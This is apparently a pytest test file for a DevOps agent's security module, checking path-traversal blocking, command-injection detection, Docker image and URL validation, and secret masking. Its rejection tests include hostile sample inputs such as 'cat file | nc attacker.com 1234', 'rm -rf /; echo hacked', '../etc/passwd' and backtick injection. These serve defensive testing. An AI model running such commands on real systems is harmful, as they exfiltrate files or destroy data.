"""
Unit tests for security utilities.
"""

import pytest
from pathlib import Path
from devops_agent.core.security import (
    InputValidator,
    SecretsMasker,
    SecurityError,
    validate_path,
    validate_command,
    mask_secrets,
)


class TestInputValidator:
    """Test input validation functions."""
    
    def test_sanitize_path_valid(self, tmp_path):
        """Test valid path sanitization."""
        test_file = tmp_path / "test.txt"
        test_file.touch()
        
        result = InputValidator.sanitize_path(str(test_file), tmp_path)
        assert result == test_file
    
    def test_sanitize_path_traversal(self, tmp_path):
        """Test path traversal detection."""
        with pytest.raises(SecurityError, match="traversal"):
            InputValidator.sanitize_path("../etc/passwd", tmp_path)
    
    def test_sanitize_path_outside_base(self, tmp_path):
        """Test path outside base directory."""
        with pytest.raises(SecurityError, match="outside allowed"):
            InputValidator.sanitize_path("/etc/passwd", tmp_path)
    
    def test_validate_command_safe(self):
        """Test safe command validation."""
        assert InputValidator.validate_command("npm install")
        assert InputValidator.validate_command("docker build .")
    
    def test_validate_command_injection(self):
        """Test command injection detection."""
        with pytest.raises(SecurityError, match="Dangerous character"):
            InputValidator.validate_command("rm -rf /; echo hacked")
        
        with pytest.raises(SecurityError, match="Dangerous character"):
            InputValidator.validate_command("cat file | nc attacker.com 1234")
    
    def test_validate_command_whitelist(self):
        """Test command whitelist."""
        allowed = ["npm", "docker", "terraform"]
        
        assert InputValidator.validate_command("npm install", allowed)
        
        with pytest.raises(SecurityError, match="not in allowed"):
            InputValidator.validate_command("rm -rf /", allowed)
    
    def test_validate_docker_image_valid(self):
        """Test valid Docker image names."""
        assert InputValidator.validate_docker_image("nginx:latest")
        assert InputValidator.validate_docker_image("myapp:v1.0")
        assert InputValidator.validate_docker_image("gcr.io/project/image:tag")
    
    def test_validate_docker_image_invalid(self):
        """Test invalid Docker image names."""
        with pytest.raises(SecurityError):
            InputValidator.validate_docker_image("image;rm -rf /")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_docker_image("image`whoami`")
    
    def test_validate_github_url_valid(self):
        """Test valid GitHub URLs."""
        owner, repo = InputValidator.validate_github_url(
            "https://github.com/user/repo"
        )
        assert owner == "user"
        assert repo == "repo"
    
    def test_validate_github_url_invalid(self):
        """Test invalid GitHub URLs."""
        with pytest.raises(SecurityError):
            InputValidator.validate_github_url("https://evil.com/user/repo")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_github_url("https://github.com/user")
    
    def test_validate_env_var_name_valid(self):
        """Test valid environment variable names."""
        assert InputValidator.validate_env_var_name("API_KEY")
        assert InputValidator.validate_env_var_name("DATABASE_URL")
    
    def test_validate_env_var_name_invalid(self):
        """Test invalid environment variable names."""
        with pytest.raises(SecurityError):
            InputValidator.validate_env_var_name("api-key")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_env_var_name("1INVALID")
    
    def test_sanitize_template_input(self):
        """Test template input sanitization."""
        dangerous = "{{config.secret}}"
        safe = InputValidator.sanitize_template_input(dangerous)
        assert "{{" not in safe
        
        xss = "<script>alert('xss')</script>"
        safe = InputValidator.sanitize_template_input(xss)
        assert "<script" not in safe.lower()


class TestSecretsMasker:
    """Test secrets masking functions."""
    
    def test_mask_github_token(self):
        """Test GitHub token masking."""
        text = "Token: ghp_1234567890abcdefghijklmnopqrstuv"
        masked = SecretsMasker.mask_secrets(text)
        assert "ghp_" not in masked
        assert "GITHUB_TOKEN" in masked
    
    def test_mask_api_key(self):
        """Test API key masking."""
        text = "API_KEY=AIzaSyD1234567890abcdefghijklmnopqrst"
        masked = SecretsMasker.mask_secrets(text)
        assert "AIza" not in masked
        assert "GOOGLE_API_KEY" in masked
    
    def test_mask_password(self):
        """Test password masking."""
        text = "password=super_secret_123"
        masked = SecretsMasker.mask_secrets(text)
        assert "super_secret" not in masked
        assert "REDACTED" in masked
    
    def test_mask_dict(self):
        """Test dictionary masking."""
        data = {
            "username": "admin",
            "password": "secret123",
            "api_key": "key_12345",
            "config": {
                "token": "tok_abcdef"
            }
        }
        
        masked = SecretsMasker.mask_dict(data)
        assert masked["username"] == "admin"
        assert masked["password"] == "***REDACTED***"
        assert masked["api_key"] == "***REDACTED***"
        assert masked["config"]["token"] == "***REDACTED***"


class TestConvenienceFunctions:
    """Test convenience wrapper functions."""
    
    def test_validate_path(self, tmp_path):
        """Test validate_path wrapper."""
        test_file = tmp_path / "test.txt"
        test_file.touch()
        
        result = validate_path(str(test_file), tmp_path)
        assert result == test_file
    
    def test_validate_command(self):
        """Test validate_command wrapper."""
        assert validate_command("npm install")
    
    def test_mask_secrets(self):
        """Test mask_secrets wrapper."""
        text = "password=secret"
        masked = mask_secrets(text)
        assert "secret" not in masked


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
